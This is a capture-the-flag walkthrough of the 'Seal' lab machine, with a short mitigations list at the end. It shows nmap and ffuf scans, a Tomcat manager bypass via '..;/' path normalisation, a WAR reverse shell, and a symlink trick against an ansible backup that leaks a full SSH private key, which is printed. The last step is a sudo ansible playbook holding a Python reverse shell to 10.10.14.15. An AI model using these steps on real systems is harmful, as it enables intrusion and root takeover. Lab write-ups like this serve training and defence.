
# Seal

- Walkthrough
- Mitigrations
- References


## Walkthrough
The tester started by scanning the host wiht nmap.

```
└──╼ $nmap -p 22,443,8080 -A  10.10.10.250
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-15 11:20 EST
Nmap scan report for 10.10.10.250
Host is up (0.022s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b894739673d07315e3f4c27411ff967 (RSA)
|   256 04a74f399565c5b08dd5492ed8440036 (ECDSA)
|_  256 b45e8393c54249de7125927123b18554 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-title: Seal Market
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
8080/tcp open  http-proxy
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 15 Nov 2023 16:21:02 GMT
|     Set-Cookie: JSESSIONID=node014o7v5l5g0rsgxsl7sq22bzqn2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 15 Nov 2023 16:21:01 GMT
|     Set-Cookie: JSESSIONID=node01pem304tamok91y11bwkngfldv0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 15 Nov 2023 16:21:02 GMT
|     Set-Cookie: JSESSIONID=node0ud0j695jx1901i1najvrjn7si1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

<snip>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.66 seconds
```

Port 8080 was hosting a Gitbucket instance. The Gitbucket instance is configured to allow registration. The Tester created an account which allowed them to view the repositories. 


![web_error](https://private-user-images.githubusercontent.com/63368388/285897564-c1728f79-769f-4086-9637-5dd27cbfa6f4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQwOTAsIm5iZiI6MTcwMTA5Mzc5MCwicGF0aCI6Ii82MzM2ODM4OC8yODU4OTc1NjQtYzE3MjhmNzktNzY5Zi00MDg2LTk2MzctNWRkMjdjYmZhNmY0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MDMxMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU1ZTA3ZTVlYTgxNDU0ZWU5NjAxMTlmNjdlYTFkMjQ0OWJmZmM1ZmMxMjJlNWJmMzY0NDQzMGUwMzAyMDAyNmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.Y-jp4piU_j45nC9xjvgutWNHJGQQOA-44QpmcSdG2lI)

The tester searched the repositories and found Tomcat credentials in the 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 commit on the 5 May 2021. 
The tester used the ffuf tool to search for different web directories on port 443 and found the Tomcat manager directory.

```
┌─[rang3r@parrot]─[~/Projects/machines/seal]
└──╼ $ffuf -w  '/home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt'    -k      -u  "https://seal.htb:443/FUZZ" -ic  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://seal.htb:443/FUZZ
 :: Wordlist         : FUZZ: /home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
                        [Status: 200, Size: 19737, Words: 7425, Lines: 519, Duration: 27ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
icon                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
css                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
js                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
                        [Status: 200, Size: 19737, Words: 7425, Lines: 519, Duration: 79ms]
:: Progress: [81630/81630] :: Job [1/1] :: 480 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
```

Tomcat services has the "WAR file to deploy" feature to deploy .war files, which could also be used to upload a malicious payload however the directory was blocked. 

The tester firsted created a payload using msfvenom 

The tester was able to access it by abusing Nginx path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the desired  page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This worked to access the manager page however required more work to 
 get the war file upload to work. The tester had to intercept the post request with burp suite and change the post URL to the bypass the address with the double period and a semicolon, shown below.


![web_error](https://private-user-images.githubusercontent.com/63368388/285900777-51dad20f-c45f-4952-88dd-c7318ab0069c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQ3NTEsIm5iZiI6MTcwMTA5NDQ1MSwicGF0aCI6Ii82MzM2ODM4OC8yODU5MDA3NzctNTFkYWQyMGYtYzQ1Zi00OTUyLTg4ZGQtYzczMThhYjAwNjljLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MTQxMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEzODlmYjk5ODgzZDFmN2M4MmI1OGFiMzk2MzUzOGQyNGQ1OTc2MjJmODZhMDY0OGE0MTU5ODI5Zjk2NjE0NzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.SKic49GtzK-MompbSwuBjZ_ycukZz2iEzfQjk94QOBE)

Once the malicious file was uploaded the tester navigated to https://seal.htb/revshell/ which executed the shell connecting it to the netcat listener. 

```
┌─[rang3r@parrot]─[~]
└──╼ $nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.250] 37552
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@seal:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -lnvp 1337
┌─[✗]─[rang3r@parrot]─[~]
└──╼ $stty raw -echo
┌─[rang3r@parrot]─[~]
nc -lnvp 1337

tomcat@seal:/var/lib/tomcat9$ export TERM=xterm
tomcat@seal:/var/lib/tomcat9$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat@seal:/var/lib/tomcat9$ hostname
seal
tomcat@seal:/var/lib/tomcat9$ 
```

The tester used the "pspy" tool to monitor the system processes and found that the "luis" account would periodically run ansible to backup the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory to the /opt/backups/files/directory. 

```
tomcat@seal:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

<snip>

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/11/27 14:27:21 CMD: UID=997   PID=245280 | ./pspy64 
2023/11/27 14:27:21 CMD: UID=0     PID=245271 | sleep 30 
2023/11/27 14:27:21 CMD: UID=0     PID=245270 | /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:21 CMD: UID=0     PID=245269 | /usr/sbin/CRON -f 

<snip>

2023/11/27 14:27:31 CMD: UID=1000  PID=245293 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:31 CMD: UID=1000  PID=245295 | 
2023/11/27 14:27:32 CMD: UID=1000  PID=245296 | 
2023/11/27 14:27:32 CMD: UID=1000  PID=245300 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:32 CMD: UID=1000  PID=245301 | 
2023/11/27 14:27:32 CMD: UID=1000  PID=245302 | /bin/sh -c /bin/sh -c 'echo ~luis && sleep 0' 
2023/11/27 14:27:32 CMD: UID=1000  PID=245304 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:32 CMD: UID=1000  PID=245305 | 

<snip>

```

```
tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

The Tomcat user has write access to the upload subdirectory in the dashboard filesystem. The tester was able to create a file in the upload dircetory which was linked to the SSH private key of the "luis" account. The tester used the below command, in the upload directory, to create the link. 

```
ln -s /home/luis/.ssh/id_rsa id_rsa
```

Once the backup process was completed and the file was backed up to the files directory the tester decompressed the file and used grep to find the private key.

```
tomcat@seal:/tmp$ gzip -d backup-2023-11-26-23:37:33.gz
tomcat@seal:/tmp$ ls
backup-2023-11-26-23:37:33  linpeas.sh	 logrotten    pspy64
hsperfdata_tomcat	    listener.py  payloadfile  tmux-997
tomcat@seal:/tmp$ cat "backup-2023-11-26-23:37:33" |  grep -a  BEGIN -A 37
dashboard/uploads/id_rsa0000600000175000017500000000503600000000000015607 0ustar00luisluis00000000000000-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
tomcat@seal:/tmp$ 
```

With the SSH key the tester was able to connect remotely to the host.  

```
┌─[✗]─[rang3r@parrot]─[~/Projects/machines/seal]
└──╼ $ssh -i id_rsa luis@10.10.10.250
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

<snip>

Last login: Mon Nov 27 13:38:42 2023 from 10.10.14.15
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
luis@seal:~$ 
```

The "luis" account is able to run the ansible-playbook command as root using sudo. The tester set up a ".yml" playbook file which contained a python reverse shell scrpt.
```
luis@seal:~$ cat test_cmd.yml 
---
- name: List Files in a Directory
  hosts: localhost
  tasks:
    - name: List files in the current directory
      shell: python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.10.14.15",3333));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
      args:
        chdir: /tmp
      register: directory_listing
    - name: Display the list of files
      debug:
        var: directory_listing.stdout_lines
luis@seal:~$ 

```

```
luis@seal:~$ sudo /usr/bin/ansible-playbook  test_cmd.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'

PLAY [List Files in a Directory] ***********************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [List files in the current directory] *************************************
```

```
┌─[rang3r@parrot]─[~]
└──╼ $nc -lnvp 3333
listening on [any] 3333 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.250] 43128
# id    
id
uid=0(root) gid=0(root) groups=0(root)
# hostname
hostname
seal
# 
```

## Mitigations 

1. Remove open register and keep repositories.
2. Store git crentials locally, outside of the git environment.
3. Configure the reverse proxy to reject paths that contain the Tomcat path parameter character ;.
4. Review ACl to ensure that folder and file access is required
5. Review account privileges to ensure they are required.


## References


https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
https://www.cherryservers.com/blog/how-to-run-remote-commands-with-ansible-shell-module
